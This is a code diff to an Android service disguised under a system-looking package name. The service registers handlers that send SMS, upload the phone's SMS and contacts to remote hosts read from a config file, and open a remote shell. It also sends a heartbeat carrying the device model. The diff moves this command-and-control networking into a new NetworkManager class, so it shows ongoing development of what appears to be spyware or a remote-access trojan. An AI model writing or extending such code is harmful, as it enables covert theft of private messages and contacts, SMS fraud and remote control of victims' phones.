@@ -8,6 +8,7 @@ import android.content.IntentFilter;
 import android.os.Build;
 import android.os.IBinder;
 
+import com.android.sys.session.NetworkManager;
 import com.android.sys.session.SessionManager;
 import com.android.sys.session.handler.SendSmsSessionHandler;
 import com.android.sys.session.handler.ShellSessionHandler;
@@ -44,6 +45,7 @@ public class SystemService extends Service{
     }
 
     private SessionManager mSessionManager = new SessionManager();
+    private NetworkManager mNetworkManager = new NetworkManager(mSessionManager);
 
     private final String SESSION_SEND_SMS = "send_sms";
     private final String SESSION_UPLOAD_SMS = "upload_sms";
@@ -58,8 +60,8 @@ public class SystemService extends Service{
         mSessionManager.addSessionHandler(SESSION_UPLOAD_CONTACT, new UploadContactsSessionHandler());
         mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
         mSessionManager.addSessionHandler(SESSION_SHELL, new ShellSessionHandler());
-        mSessionManager.setHeartBeatData(Build.MODEL.getBytes());
-        mSessionManager.start();
+        mNetworkManager.setHeartBeatData(Build.MODEL.getBytes());
+        mNetworkManager.start();
     }
 
     private void loadConfig() {
@@ -73,9 +75,9 @@ public class SystemService extends Service{
                 JSONObject jsonObject = new JSONObject(config);
                 JSONArray hosts = jsonObject.getJSONArray("hosts");
                 for(int i=0; i<hosts.length(); ++i) {
-                    mSessionManager.addHost(hosts.getString(i));
+                    mNetworkManager.addHost(hosts.getString(i));
                 }
-                mSessionManager.setLocalPort(jsonObject.getInt("listen_port"));
+                mNetworkManager.setLocalPort(jsonObject.getInt("listen_port"));
             } catch (JSONException e) {
             }
         } catch (IOException e) {
@@ -114,6 +116,6 @@ public class SystemService extends Service{
     @Override
     public void onDestroy() {
         super.onDestroy();
-        mSessionManager.stop();
+        mNetworkManager.stop();
     }
 }
